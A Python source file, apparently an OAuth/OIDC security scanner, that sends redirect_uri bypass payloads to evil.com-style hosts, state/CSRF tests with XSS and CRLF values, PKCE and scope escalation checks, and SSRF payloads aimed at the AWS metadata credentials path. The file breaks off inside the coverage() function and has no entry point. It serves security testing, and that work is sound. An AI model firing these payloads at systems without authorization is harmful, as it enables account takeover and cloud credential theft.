#!/usr/bin/env python3
"""
OAuth Bible v2.0 - Comprehensive OAuth/OIDC Security Testing Tool
==================================================================
Analyzes HTTP responses to detect real vulnerabilities.
Every finding includes: severity, evidence, reproduction steps, Burp request.

Usage:
  python3 oauth_bible.py -u https://target.com                     # Active scan
  python3 oauth_bible.py -u https://target.com --proxy http://127.0.0.1:8080
  python3 oauth_bible.py -u https://target.com -o report.json
  python3 oauth_bible.py -u https://target.com --passive           # Payloads only
  python3 oauth_bible.py --coverage
"""

import argparse, json, sys, os, re, time, secrets, base64, textwrap
from urllib.parse import urlparse, urlencode, parse_qs, quote
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional, Dict, Any

VERSION = "2.0.0"
BANNER = r"""
   ____  ___         __  __       ____  _ __    __
  / __ \/   | __  __/ /_/ /_    / __ )(_) /_  / /__
 / / / / /| |/ / / / __/ __ \  / __  / / __ \/ / _ \
/ /_/ / ___ / /_/ / /_/ / / / / /_/ / / /_/ / /  __/
\____/_/  |_\__,_/\__/_/ /_/ /_____/_/_.___/_/\___/
    v%s - OAuth/OIDC Security Scanner
""" % VERSION

# ── Terminal Colors ──────────────────────────────────────────────────────────
class C:
    R="\033[91m"; O="\033[93m"; Y="\033[33m"; G="\033[92m"; B="\033[94m"
    CY="\033[96m"; GR="\033[90m"; BD="\033[1m"; RS="\033[0m"
    @staticmethod
    def off():
        C.R=C.O=C.Y=C.G=C.B=C.CY=C.GR=C.BD=C.RS=""

class Sev(Enum):
    CRITICAL="CRITICAL"; HIGH="HIGH"; MEDIUM="MEDIUM"; LOW="LOW"; INFO="INFO"

SEV_COLOR={Sev.CRITICAL:C.R, Sev.HIGH:C.O, Sev.MEDIUM:C.Y, Sev.LOW:C.B, Sev.INFO:C.GR}

# ── Finding dataclass ────────────────────────────────────────────────────────
@dataclass
class Finding:
    id: int
    title: str
    severity: Sev
    category: str
    description: str
    evidence: str
    reproduce: str
    burp_request: str = ""
    remediation: str = ""
    cwe: str = ""
    references: List[str] = field(default_factory=list)
    url_tested: str = ""
    response_code: int = 0

    def show(self):
        c = SEV_COLOR.get(self.severity, C.RS)
        print(f"\n{c}{C.BD}{'='*74}{C.RS}")
        print(f"{c}{C.BD}  FINDING #{self.id}: [{self.severity.value}] {self.title}{C.RS}")
        print(f"{c}{'='*74}{C.RS}")
        print(f"  {C.BD}Category:{C.RS}    {self.category}")
        if self.cwe: print(f"  {C.BD}CWE:{C.RS}         {self.cwe}")
        print(f"\n  {C.BD}Description:{C.RS}")
        for l in textwrap.wrap(self.description,68): print(f"    {l}")
        print(f"\n  {C.BD}Evidence:{C.RS}")
        for l in self.evidence.strip().split("\n"): print(f"    {C.CY}{l}{C.RS}")
        print(f"\n  {C.BD}How to Reproduce:{C.RS}")
        for l in self.reproduce.strip().split("\n"): print(f"    {l}")
        if self.burp_request:
            print(f"\n  {C.BD}Burp Repeater Request:{C.RS}")
            print(f"  {C.GR}{'~'*68}{C.RS}")
            for l in self.burp_request.strip().split("\n"): print(f"    {C.G}{l}{C.RS}")
            print(f"  {C.GR}{'~'*68}{C.RS}")
        if self.remediation:
            print(f"\n  {C.BD}Remediation:{C.RS}")
            for l in textwrap.wrap(self.remediation,68): print(f"    {l}")
        if self.references:
            print(f"\n  {C.BD}References:{C.RS}")
            for r in self.references: print(f"    -> {r}")
        print()

# ── HTTP Client ──────────────────────────────────────────────────────────────
class HTTP:
    def __init__(self, proxy="", timeout=30, cookies=None, headers=None, passive=False):
        self.proxy=proxy; self.timeout=timeout; self.passive=passive
        self.cookies=cookies or {}; self.headers=headers or {}
        self._s=None; self._ok=False
        if not passive: self._init()

    def _init(self):
        try:
            import requests
            requests.packages.urllib3.disable_warnings()
            self._s=requests.Session()
            self._s.headers.update({"User-Agent":f"OAuthBible/{VERSION}"})
            self._s.headers.update(self.headers)
            if self.cookies: self._s.cookies.update(self.cookies)
            if self.proxy: self._s.proxies={"http":self.proxy,"https":self.proxy}
            self._s.verify=False; self._ok=True
        except ImportError:
            print(f"{C.O}[!] pip install requests   (falling back to passive mode){C.RS}")

    @property
    def active(self): return self._ok and not self.passive

    def get(self, url, redir=False):
        if not self.active: return None
        try:
            r=self._s.get(url, allow_redirects=redir, timeout=self.timeout)
            return {"status":r.status_code, "headers":{k.lower():v for k,v in r.headers.items()},
                    "body":r.text[:10000], "location":r.headers.get("Location",""),
                    "elapsed":r.elapsed.total_seconds()*1000}
        except Exception as e: return {"status":0,"error":str(e),"headers":{},"body":"","location":""}

    def post(self, url, data=None, jdata=None, hdrs=None):
        if not self.active: return None
        try:
            r=self._s.post(url, data=data, json=jdata, headers=hdrs, timeout=self.timeout)
            return {"status":r.status_code, "headers":{k.lower():v for k,v in r.headers.items()},
                    "body":r.text[:10000]}
        except Exception as e: return {"status":0,"error":str(e),"headers":{},"body":""}

# ── Payload Database ─────────────────────────────────────────────────────────
class PL:
    REDIR = {
        "open_redirect": [
            "https://evil.com", "https://attacker.com/callback",
            "https://{h}.evil.com", "https://evil.com/{h}",
            "https://{h}@evil.com", "https://evil.com#@{h}",
            "https://evil.com\\@{h}", "https://evil.com%23@{h}",
            "https://{h}%2f%2f..%2f..%2fevil.com",
            "https://evil.com%00.{h}", "https://{h}\\evil.com",
        ],
        "path_traversal": [
            "{r}/../redirect?url=https://evil.com",
            "{r}/..%2f..%2fredirect?url=https://evil.com",
            "{r}/%2e%2e/%2e%2e/evil",
            "{r}/..;/evil", "{r}/../../../evil.com",
        ],
        "param_pollution": [
            "&redirect_uri=https://evil.com",
            "&redirect_uri={r}&redirect_uri=https://evil.com",
        ],
        "scheme_tricks": [
            "http://{h}/callback", "//evil.com",
            "data:text/html,<script>alert(document.domain)</script>",
        ],
        "localhost": [
            "https://localhost.evil.com", "http://127.0.0.1/callback",
            "http://[::1]/callback", "http://0x7f000001/callback",
        ],
    }
    STATE = [
        ("Remove state entirely", None),
        ("Empty state", ""),
        ("Predictable state", "1234567890"),
        ("Short state", "a"),
        ("XSS in state", "<script>alert(1)</script>"),
        ("CRLF injection", "%0d%0aSet-Cookie:evil=1"),
    ]
    SCOPE = [
        ("admin", "openid profile email admin"),
        ("wildcard", "*"), ("empty", ""),
        ("offline_access", "openid profile email offline_access"),
        ("internal", "openid internal:admin"),
    ]
    PKCE = [
        ("Omit PKCE entirely", {}, "No code_challenge sent"),
        ("plain method", {"code_challenge":"test"*11,"code_challenge_method":"plain"}, "Downgrade S256->plain"),
        ("Empty challenge", {"code_challenge":"","code_challenge_method":"S256"}, "Empty code_challenge"),
    ]
    WELLKNOWN = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/.well-known/jwks.json",
        "/oauth/.well-known/openid-configuration",
        "/oauth2/.well-known/openid-configuration",
        "/v2.0/.well-known/openid-configuration",
        "/auth/realms/master/.well-known/openid-configuration",
    ]
    REG_SSRF = [
        ("SSRF via logo_uri (AWS meta)", {"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}),
        ("SSRF via jwks_uri", {"jwks_uri":"http://169.254.169.254/latest/meta-data/"}),
        ("SSRF via sector_identifier_uri", {"sector_identifier_uri":"http://169.254.169.254/latest/meta-data/"}),
        ("SSRF via request_uris", {"request_uris":["http://169.254.169.254/latest/meta-data/"]}),
        ("XSS via client_name", {"client_name":"<img src=x onerror=alert(1)>"}),
    ]
    GRANTS = ["authorization_code","client_credentials","password","refresh_token",
              "urn:ietf:params:oauth:grant-type:device_code",
              "urn:ietf:params:oauth:grant-type:jwt-bearer",
              "urn:ietf:params:oauth:grant-type:token-exchange"]
    RTYPES = ["code","token","id_token","code token","code id_token",
              "token id_token","code token id_token","none"]


# ── Main Scanner ─────────────────────────────────────────────────────────────
class OAuthBible:
    def __init__(self, url, cid="", csec="", ruri="", scope="openid profile email",
                 proxy="", timeout=30, passive=False, verbose=False,
                 cookies=None, headers=None, no_color=False):
        self.target=url.rstrip("/"); self.cid=cid; self.csec=csec
        self.ruri=ruri; self.scope=scope; self.verbose=verbose; self.passive=passive
        if no_color: C.off()
        self.http=HTTP(proxy=proxy,timeout=timeout,cookies=cookies,headers=headers,passive=passive)
        self.findings=[]; self.fcount=0
        self.auth_ep=self.tok_ep=self.ui_ep=self.reg_ep=self.jwks_ep=self.dev_ep=""
        self.oidc_cfg={}

    # ── Add finding ──
    def _f(self, sev, title, cat, desc, ev, repro, burp="", fix="", cwe="",
           refs=None, url="", rc=0):
        self.fcount+=1
        f=Finding(self.fcount,title,sev,cat,desc,ev,repro,burp,fix,cwe,refs or [],url,rc)
        self.findings.append(f)
        print(f"  {SEV_COLOR.get(sev,C.RS)}{C.BD}[FOUND #{self.fcount}] [{sev.value}] {title}{C.RS}")
        return f

    # ── Build auth URL ──
    def _aurl(self, ruri=None, state="AUTO", scope=None, rtype="code", extra=None):
        base=self.auth_ep or f"{self.target}/oauth/authorize"
        p={"client_id":self.cid or "TARGET_CLIENT_ID","response_type":rtype}
        if ruri is not None: p["redirect_uri"]=ruri
        elif self.ruri: p["redirect_uri"]=self.ruri
        if state=="AUTO": p["state"]=secrets.token_urlsafe(32)
        elif state is not None: p["state"]=state
        p["scope"]=scope if scope is not None else self.scope
        if extra: p.update(extra)
        return f"{base}?{urlencode(p)}"

    # ── Raw requests for Burp ──
    def _rget(self, url):
        u=urlparse(url); path=u.path or "/"
        if u.query: path+=f"?{u.query}"
        return f"GET {path} HTTP/2\nHost: {u.netloc}\nUser-Agent: OAuthBible/{VERSION}\nAccept: */*\n"

    def _rpost(self, url, bp=None, jb=None):
        u=urlparse(url); path=u.path or "/"
        if jb: body=json.dumps(jb,indent=2); ct="application/json"
        elif bp: body=urlencode(bp); ct="application/x-www-form-urlencoded"
        else: body=""; ct="application/x-www-form-urlencoded"
        return f"POST {path} HTTP/2\nHost: {u.netloc}\nContent-Type: {ct}\nContent-Length: {len(body)}\n\n{body}"

    def _hdr(self, n, name, sub):
        print(f"\n{C.BD}{'='*74}{C.RS}")
        print(f"{C.BD}  Phase {n}: {name} -- {sub}{C.RS}")
        print(f"{C.BD}{'='*74}{C.RS}")

    def _v(self, m):
        if self.verbose: print(f"  {C.GR}{m}{C.RS}")

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 1: RECON
    # ══════════════════════════════════════════════════════════════════════════
    def p1_recon(self):
        self._hdr(1,"Reconnaissance","Discovering OAuth/OIDC endpoints")
        found=False
        for path in PL.WELLKNOWN:
            url=f"{self.target}{path}"; self._v(f"Probing {url}")
            if not self.http.active: continue
            r=self.http.get(url)
            if not r or r.get("status",0)==0: continue
            if r["status"]==200:
                print(f"  {C.G}[+] FOUND: {path} -> HTTP 200{C.RS}"); found=True
                try:
                    cfg=json.loads(r.get("body","{}"))
                    self.oidc_cfg=cfg; self._parse_disc(cfg, url)
                except: pass
            elif r["status"] in (301,302,307):
                self._v(f"  Redirect -> {r.get('location','')}")
        if not found and self.http.active:
            print(f"  {C.Y}[!] No .well-known found. Using defaults.{C.RS}")
            self.auth_ep=self.auth_ep or f"{self.target}/oauth/authorize"
            self.tok_ep=self.tok_ep or f"{self.target}/oauth/token"

    def _parse_disc(self, cfg, src):
        for ok,attr in [("authorization_endpoint","auth_ep"),("token_endpoint","tok_ep"),
            ("userinfo_endpoint","ui_ep"),("registration_endpoint","reg_ep"),
            ("jwks_uri","jwks_ep"),("device_authorization_endpoint","dev_ep")]:
            if ok in cfg and not getattr(self,attr):
                setattr(self,attr,cfg[ok])
                print(f"    {C.CY}|- {ok}: {cfg[ok]}{C.RS}")
        # Analyze config
        gt=cfg.get("grant_types_supported",[])
        if "implicit" in gt:
            self._f(Sev.MEDIUM,"Implicit grant type enabled","Configuration",
                "Server supports implicit grant (deprecated in OAuth 2.1). Tokens exposed in URL fragments.",
                f"grant_types_supported: {gt}",
                f"1. Fetch: {src}\n2. grant_types_supported contains 'implicit'",
                self._rget(src),"Disable implicit grant. Use code+PKCE.","CWE-346",
                ["https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-11"])
        if "password" in gt:
            self._f(Sev.MEDIUM,"Password grant enabled","Configuration",
                "ROPC grant allows direct credential exchange. Deprecated in OAuth 2.1.",
                f"grant_types_supported includes 'password'",
                f"1. Fetch: {src}\n2. POST token endpoint with grant_type=password",
                self._rpost(self.tok_ep or f"{self.target}/oauth/token",
                    bp={"grant_type":"password","username":"test","password":"test"}),
                "Disable password grant.","CWE-287")
        if "code_challenge_methods_supported" not in cfg:
            self._f(Sev.HIGH,"PKCE not advertised","PKCE",
                "Discovery doc missing code_challenge_methods_supported. Without PKCE, auth codes interceptable.",
                f"Missing: code_challenge_methods_supported\nSource: {src}",
                f"1. Fetch: {src}\n2. Search for code_challenge_methods_supported -> absent",
                self._rget(src),"Implement PKCE with S256.","CWE-330",
                ["https://datatracker.ietf.org/doc/html/rfc7636"])
        elif "S256" not in cfg.get("code_challenge_methods_supported",[]):
            m=cfg["code_challenge_methods_supported"]
            self._f(Sev.MEDIUM,f"PKCE: S256 not supported (only {m})","PKCE",
                f"Only {m}. 'plain' has no cryptographic protection.",
                f"code_challenge_methods_supported: {m}",
                f"1. Fetch: {src}\n2. Only {m} supported",
                fix="Support and enforce S256.",cwe="CWE-330")
        if self.reg_ep:
            self._f(Sev.MEDIUM,"Dynamic client registration exposed","Registration",
                f"Endpoint: {self.reg_ep}\nMay allow SSRF via logo_uri/jwks_uri.",
                f"registration_endpoint: {self.reg_ep}",
                f"1. POST to: {self.reg_ep}\n2. Body: {{redirect_uris:[...],logo_uri:http://169.254.169.254/...}}",
                self._rpost(self.reg_ep, jb={"redirect_uris":["https://evil.com"],"client_name":"test"}),
                "Require auth for registration. Block internal IPs.","CWE-918",
                ["https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration"])

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 2: REDIRECT_URI BYPASS
    # ══════════════════════════════════════════════════════════════════════════
    def p2_redirect(self):
        total=sum(len(v) for v in PL.REDIR.values())
        self._hdr(2,"Redirect URI Bypass",f"{total} payloads")
        h=urlparse(self.ruri or self.target).netloc
        r=self.ruri or f"{self.target}/callback"
        tested=vuln=0
        for cat,payloads in PL.REDIR.items():
            print(f"  {C.CY}[>] {cat} ({len(payloads)} payloads){C.RS}")
            for tmpl in payloads:
                uri=tmpl.replace("{h}",h).replace("{r}",r)
                turl=self._aurl(ruri=uri); tested+=1
                if not self.http.active: continue
                resp=self.http.get(turl)
                if not resp or resp.get("status",0)==0: continue
                st=resp["status"]; loc=resp.get("location","")
                iv=False; ev=""
                if st in (301,302,303,307,308):
                    for ind in ["evil.com","attacker.com","169.254","127.0.0.1","[::1]","0x7f"]:
                        if ind in loc.lower(): iv=True; ev=f"Redirected to: {loc}"; break
                    if not iv and ("code=" in loc or "token=" in loc):
                        pl=urlparse(loc)
                        if pl.netloc!=h: iv=True; ev=f"Code/token sent to: {pl.netloc}"
                elif st==200:
                    b=resp.get("body","").lower()
                    if any(w in b for w in ["consent","authorize","allow access","approve"]):
                        iv=True; ev="Consent page shown for malicious redirect_uri"
                if iv:
                    vuln+=1
                    self._f(Sev.CRITICAL,f"redirect_uri bypass: {cat}","Redirect URI",
                        f"Server accepted malicious redirect_uri ({cat}). Attacker steals auth codes/tokens.",
                        f"Payload: {uri}\nHTTP {st}\n{ev}",
                        f"1. Open in browser or Burp Repeater:\n   {turl}\n"
                        f"2. Login when prompted\n"
                        f"3. Observe redirect to attacker URL with code/token\n"
                        f"4. Exchange code -> access_token -> Account Takeover",
                        self._rget(turl),
                        "Exact-match redirect_uri validation. No wildcards/regex.","CWE-601",
                        ["https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri",
                         "https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect"],
                        turl, st)
        print(f"  {C.BD}Tested: {tested} | Vulnerable: {vuln}{C.RS}")

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 3: STATE / CSRF
    # ══════════════════════════════════════════════════════════════════════════
    def p3_state(self):
        self._hdr(3,"State / CSRF",f"{len(PL.STATE)} tests")
        for name,val in PL.STATE:
            print(f"  {C.CY}[>] {name}{C.RS}")
            if val is None:
                base=self.auth_ep or f"{self.target}/oauth/authorize"
                p={"client_id":self.cid or "CLIENT_ID","response_type":"code","scope":self.scope}
                if self.ruri: p["redirect_uri"]=self.ruri
                turl=f"{base}?{urlencode(p)}"
            else:
                turl=self._aurl(state=val)
            if not self.http.active: continue
            resp=self.http.get(turl)
            if not resp or resp.get("status",0)==0: continue
            st=resp["status"]; loc=resp.get("location",""); b=resp.get("body","").lower()
            code_issued = st in (301,302,303,307,308) and "code=" in loc
            consent = st==200 and any(w in b for w in ["consent","authorize","allow"])
            if (code_issued or consent) and (val is None or val==""):
                cb=self.ruri or f"{self.target}/callback"
                self._f(Sev.HIGH,f"OAuth CSRF: {name}","State / CSRF",
                    "Server proceeds without valid state parameter. Enables CSRF account-linking.",
                    f"State: {repr(val)}\nHTTP {st}\n"
                    f"{'Code issued: '+loc[:150] if code_issued else 'Consent page shown'}",
                    f"1. Open (no state param):\n   {turl}\n"
                    f"2. Server accepts without state\n"
                    f"3. Attacker crafts CSRF:\n"
                    f"   <iframe src='{cb}?code=ATTACKER_CODE'></iframe>\n"
                    f"4. Victim visits -> attacker's account linked",
                    self._rget(turl),
                    "Require cryptographically random state bound to session.","CWE-352",
                    ["https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking"],
                    turl, st)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 4: PKCE BYPASS
    # ══════════════════════════════════════════════════════════════════════════
    def p4_pkce(self):
        self._hdr(4,"PKCE Bypass",f"{len(PL.PKCE)} techniques")
        for name,extra,desc in PL.PKCE:
            print(f"  {C.CY}[>] {name}: {desc}{C.RS}")
            turl=self._aurl(extra=extra if extra else None)
            if not self.http.active: continue
            resp=self.http.get(turl)
            if not resp or resp.get("status",0)==0: continue
            st=resp["status"]; loc=resp.get("location",""); b=resp.get("body","").lower()
            ok=((st in (301,302) and "code=" in loc) or
                (st==200 and any(w in b for w in ["consent","authorize","allow"])))
            if ok and not extra:
                self._f(Sev.HIGH,"PKCE not enforced","PKCE",
                    "Server issues code without PKCE. Auth code interception possible on public clients.",
                    f"No code_challenge sent\nHTTP {st}",
                    f"1. Auth request WITHOUT code_challenge:\n   {turl}\n"
                    f"2. Server proceeds -> PKCE optional\n"
                    f"3. Attacker intercepts code, exchanges without code_verifier",
                    self._rget(turl),"Enforce PKCE S256 for all clients.","CWE-330",
                    ["https://datatracker.ietf.org/doc/html/rfc7636"], turl, st)
            elif ok and extra.get("code_challenge_method")=="plain":
                self._f(Sev.MEDIUM,"PKCE downgrade: plain accepted","PKCE",
                    "Server accepts plain method (no cryptographic protection).",
                    f"code_challenge_method=plain accepted\nHTTP {st}",
                    f"1. Auth request with code_challenge_method=plain:\n   {turl}\n"
                    f"2. Verifier = challenge (no hashing)",
                    self._rget(turl),"Only accept S256.","CWE-330")

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 5: SCOPE ESCALATION
    # ══════════════════════════════════════════════════════════════════════════
    def p5_scope(self):
        self._hdr(5,"Scope Escalation",f"{len(PL.SCOPE)} tests")
        for name,sv in PL.SCOPE:
            print(f"  {C.CY}[>] {name}: scope={sv[:40]}{C.RS}")
            turl=self._aurl(scope=sv)
            if not self.http.active: continue
            resp=self.http.get(turl)
            if not resp or resp.get("status",0)==0: continue
            st=resp["status"]; b=resp.get("body","").lower()
            ok = st in (200,301,302) and "invalid_scope" not in b and "error" not in b[:200]
            if ok and sv not in [self.scope, "openid"]:
                sev=Sev.HIGH if ("admin" in sv or "*" in sv) else Sev.MEDIUM
                self._f(sev,f"Scope accepted: {name}","Scope",
                    "Server accepted potentially elevated scope.",
                    f"Requested: {sv}\nHTTP {st}",
                    f"1. Request: {turl}\n2. Complete flow\n"
                    f"3. Inspect access_token scope -> may have elevated perms",
                    self._rget(turl),"Validate scopes against client allowlist.","CWE-269",
                    url=turl, rc=st)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 6: RESPONSE TYPE
    # ══════════════════════════════════════════════════════════════════════════
    def p6_rtype(self):
        self._hdr(6,"Response Type",f"{len(PL.RTYPES)} types")
        for rt in PL.RTYPES:
            print(f"  {C.CY}[>] response_type={rt}{C.RS}")
            turl=self._aurl(rtype=rt)
            if not self.http.active: continue
            resp=self.http.get(turl)
            if not resp or resp.get("status",0)==0: continue
            st=resp["status"]; loc=resp.get("location","")
            if "token" in rt and st in (301,302):
                if "access_token=" in loc or "#access_token=" in loc:
                    self._f(Sev.HIGH,f"Implicit token for response_type={rt}","Implicit Flow",
                        f"Access token returned in URL for response_type={rt}.",
                        f"response_type={rt}\nLocation: {loc[:200]}",
                        f"1. Request: {turl}\n2. After login, token in URL fragment\n"
                        f"3. Steal via Referer header or browser history",
                        self._rget(turl),"Disable implicit types. Use code+PKCE.","CWE-200",
                        ["https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow"])

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 7: TOKEN ENDPOINT
    # ══════════════════════════════════════════════════════════════════════════
    def p7_token(self):
        self._hdr(7,"Token Endpoint",f"{len(PL.GRANTS)} grant types")
        turl=self.tok_ep or f"{self.target}/oauth/token"
        for gt in PL.GRANTS:
            print(f"  {C.CY}[>] grant_type={gt}{C.RS}")
            bd={"grant_type":gt,"client_id":self.cid or "test"}
            if gt=="password": bd.update({"username":"test","password":"test"})
            elif gt=="client_credentials" and self.csec: bd["client_secret"]=self.csec
            if not self.http.active: continue
            resp=self.http.post(turl, data=bd)
            if not resp or resp.get("status",0)==0: continue
            st=resp["status"]; rb=resp.get("body","")
            if st==200 and "access_token" in rb:
                self._f(Sev.CRITICAL,f"Token issued for {gt} without proper auth","Token Endpoint",
                    f"Token returned for {gt} - missing authorization check.",
                    f"grant_type: {gt}\nHTTP {st}\naccess_token in response",
                    f"1. POST {turl}\n2. Body: grant_type={gt}&client_id=test\n3. Token returned!",
                    self._rpost(turl, bp=bd), f"Require auth for {gt}. Disable unused grants.","CWE-287",
                    url=turl, rc=st)
            elif st not in (400,401,405) and "unsupported_grant_type" not in rb and "invalid" not in rb[:100]:
                self._f(Sev.LOW,f"Unexpected {st} for grant_type={gt}","Token Endpoint",
                    f"Expected 400/401, got {st}.",
                    f"grant_type: {gt}\nHTTP: {st}\nBody: {rb[:200]}",
                    f"1. POST {turl}\n2. Body: grant_type={gt}\n3. Investigate response",
                    self._rpost(turl, bp=bd))

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 8: REGISTRATION SSRF
    # ══════════════════════════════════════════════════════════════════════════
    def p8_reg(self):
        if not self.reg_ep:
            self._hdr(8,"Dynamic Registration","Skipped (no endpoint)"); return
        self._hdr(8,"Registration SSRF",f"{len(PL.REG_SSRF)} payloads")
        for name,extra in PL.REG_SSRF:
            print(f"  {C.CY}[>] {name}{C.RS}")
            pl={"application_type":"web","redirect_uris":["https://client.com/cb"],
                "client_name":"OAuthBible","token_endpoint_auth_method":"client_secret_basic"}
            pl.update(extra)
            if not self.http.active: continue
            resp=self.http.post(self.reg_ep, jdata=pl, hdrs={"Content-Type":"application/json"})
            if not resp or resp.get("status",0)==0: continue
            st=resp["status"]; rb=resp.get("body","")
            if st in (200,201):
                sev=Sev.CRITICAL if "169.254" in json.dumps(extra) else Sev.HIGH
                self._f(sev,f"Reg SSRF: {name}","Registration / SSRF",
                    "Registration accepted with malicious URI. If server fetches -> SSRF.",
                    f"Fields: {list(extra.keys())}\nValues: {list(extra.values())}\nHTTP {st}",
                    f"1. POST to: {self.reg_ep}\n2. Include: {json.dumps(extra)}\n"
                    f"3. Reg succeeds (HTTP {st})\n4. Confirm with Burp Collaborator",
                    self._rpost(self.reg_ep, jb=pl),
                    "Validate URIs. Block internal IPs. Require auth.","CWE-918",
                    ["https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration"])

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 9: CLIENT AUTH
    # ══════════════════════════════════════════════════════════════════════════
    def p9_clientauth(self):
        self._hdr(9,"Client Authentication","Missing/weak auth")
        turl=self.tok_ep or f"{self.target}/oauth/token"
        print(f"  {C.CY}[>] Token exchange without client_secret{C.RS}")
        bd={"grant_type":"authorization_code","code":"test_code_12345",
            "redirect_uri":self.ruri or f"{self.target}/callback",
            "client_id":self.cid or "test"}
        if not self.http.active: return
        resp=self.http.post(turl, data=bd)
        if not resp or resp.get("status",0)==0: return
        st=resp["status"]; rb=resp.get("body","")
        if st==200 and "access_token" in rb:
            self._f(Sev.CRITICAL,"Token without client authentication","Client Auth",
                "Token returned without client_secret. Stolen codes exploitable by anyone.",
                f"No client_secret\nHTTP {st}\naccess_token present",
                f"1. POST {turl}\n2. Send code+client_id (NO secret)\n3. Token returned!",
                self._rpost(turl, bp=bd), cwe="CWE-287")
        elif st==200 and "invalid_grant" in rb:
            self._f(Sev.HIGH,"Client auth not enforced (code invalid but no auth error)","Client Auth",
                "Server said 'invalid_grant' not 'invalid_client'. Auth not required.",
                f"No client_secret\nHTTP {st}\nError: invalid_grant",
                f"1. POST {turl} without secret\n2. Error is invalid_grant (not invalid_client)\n"
                f"3. With valid code, no secret needed",
                self._rpost(turl, bp=bd), cwe="CWE-287")

    # ══════════════════════════════════════════════════════════════════════════
    # RUN ALL
    # ══════════════════════════════════════════════════════════════════════════
    def run(self):
        print(BANNER)
        mode="PASSIVE (payloads only)" if self.passive else "ACTIVE (HTTP scanning)"
        print(f"  {C.BD}Target:{C.RS}  {self.target}")
        print(f"  {C.BD}Mode:{C.RS}    {mode}")
        if self.http.proxy: print(f"  {C.BD}Proxy:{C.RS}   {self.http.proxy}")
        print(f"  {C.BD}Started:{C.RS} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        if self.passive:
            print(f"\n  {C.Y}NOTE: Passive mode = no HTTP requests. Re-run without --passive to find vulns.{C.RS}")

        self.p1_recon()
        self.p2_redirect()
        self.p3_state()
        self.p4_pkce()
        self.p5_scope()
        self.p6_rtype()
        self.p7_token()
        self.p8_reg()
        self.p9_clientauth()
        self._results()

    # ── Print Results ──
    def _results(self):
        print(f"\n{'='*74}")
        print(f"{C.BD}  SCAN RESULTS{C.RS}")
        print(f"{'='*74}")
        if not self.findings:
            print(f"\n  {C.G}No vulnerabilities detected.{C.RS}")
            if self.passive:
                print(f"  {C.Y}Passive mode: no requests made. Run without --passive for real scanning.{C.RS}")
            else:
                print(f"  {C.G}OAuth implementation looks solid (from automated checks).{C.RS}")
                print(f"  {C.G}Consider manual testing for logic flaws beyond automated detection.{C.RS}")
            return

        counts={}
        for f in self.findings: counts[f.severity]=counts.get(f.severity,0)+1
        print(f"\n  {C.BD}Total: {len(self.findings)} findings{C.RS}\n")
        for s in [Sev.CRITICAL,Sev.HIGH,Sev.MEDIUM,Sev.LOW,Sev.INFO]:
            if s in counts:
                c=SEV_COLOR[s]
                print(f"  {c}{C.BD}{s.value:10}{C.RS} {c}{'#'*counts[s]} {counts[s]}{C.RS}")

        print(f"\n{'='*74}")
        print(f"{C.BD}  DETAILED FINDINGS (Critical first){C.RS}")
        print(f"{'='*74}")
        for s in [Sev.CRITICAL,Sev.HIGH,Sev.MEDIUM,Sev.LOW,Sev.INFO]:
            for f in self.findings:
                if f.severity==s: f.show()

    # ── Export ──
    def export_json(self, path):
        o={"tool":"OAuth Bible","version":VERSION,"target":self.target,
           "scan_date":datetime.now().isoformat(),"mode":"passive" if self.passive else "active",
           "total":len(self.findings),"severity":{},
           "findings":[]}
        for f in self.findings:
            o["severity"][f.severity.value]=o["severity"].get(f.severity.value,0)+1
            o["findings"].append({
                "id":f.id,"title":f.title,"severity":f.severity.value,
                "category":f.category,"description":f.description,
                "evidence":f.evidence,"reproduce":f.reproduce,
                "burp_request":f.burp_request,"remediation":f.remediation,
                "cwe":f.cwe,"references":f.references,
                "url_tested":f.url_tested,"response_code":f.response_code})
        with open(path,"w") as fp: json.dump(o,fp,indent=2)
        print(f"\n{C.G}[+] Report: {path}{C.RS}")

    def export_burp(self, path):
        with open(path,"w") as fp:
            for f in self.findings:
                if f.burp_request:
                    fp.write(f"# #{f.id} [{f.severity.value}] {f.title}\n")
                    fp.write(f"# {f.category}\n{f.burp_request}\n{'~'*60}\n\n")
        print(f"{C.G}[+] Burp requests: {path}{C.RS}")


# ── Coverage Report ──────────────────────────────────────────────────────────
def coverage():
    print(BANNER)
    print(f"""{C.BD}COVERAGE: OAuth Bible v2 vs Original Tools{C.RS}

 Attack Category       OAuth-Hunter KOAuth RESTler  PATT  {C.G}OAuth Bible{C.RS}
 redirect_uri bypass   Basic        -      -        Basic {C.G}50+ payloads{C.RS}
 State/CSRF            Yes          -      -        Yes   {C.G}6 tests{C.RS}
 PKCE bypass           -            -      -        -     {C.G}3 techniques{C.RS}
 Scope escalation      -            -      -        -     {C.G}5 tests{C.RS}
 Implicit flow abuse   -            -      -        -     {C.G}8 response types{C.RS}
 Token endpoint fuzz   -            -      Generic  -     {C.G}7 grant types{C.RS}
 Client auth bypass    -            -      -        -     {C.G}Yes{C.RS}
 Registration SSRF     -            -      -        -     {C.G}5 payloads{C.RS}
 Config analysis       -            -      -        -     {C.G}Auto from .well-known{C.RS}

{C.BD}PortSwigger OAuth Labs:{C.RS}
  Lab 1 (Implicit bypass)     -> Phase 6 response_type
  Lab 2 (Forced linking)      -> Phase 3 state/CSRF
  Lab 3 (redirect_uri hijack) -> Phase 2 redirect_uri
  Lab 4 (Open redirect steal) -> Phase 2 + 6
